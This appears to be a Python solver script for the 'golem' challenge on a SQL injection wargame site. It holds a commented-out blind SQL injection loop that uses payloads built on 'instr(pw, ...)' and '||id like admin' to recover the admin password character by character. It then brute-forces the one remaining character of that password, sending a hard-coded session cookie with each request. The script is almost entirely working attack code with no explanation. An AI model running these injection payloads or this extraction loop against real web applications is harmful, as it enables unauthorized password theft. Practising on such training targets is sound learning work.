import requests

target = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = {"PHPSESSID": "q6g6gipia2tga8jpt11pvvanrb"}
length = 8

pw = ''

ds = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

pas = ['7','d','6','2','9','0','b']


print("Start")
'''for i in range(1, length + 1):
	for j in ds: 
	        pay = f"?pw='||id like 'admin'%26%26instr(pw,'{j}') like {i}%23"
	        res = requests.get(target + pay, cookies=cookies)
	        if "Hello admin" in res.text:
	            pw += j
	            print(i,j)
	            break

print("pw :", pw)
'''
for i in pas:
	string = '7' + i + 'd6290b'
	pay =f"?pw={string}"
	res = requests.get(target+pay,cookies=cookies)
	if("Clear" in res.text):
		print(i)
		break
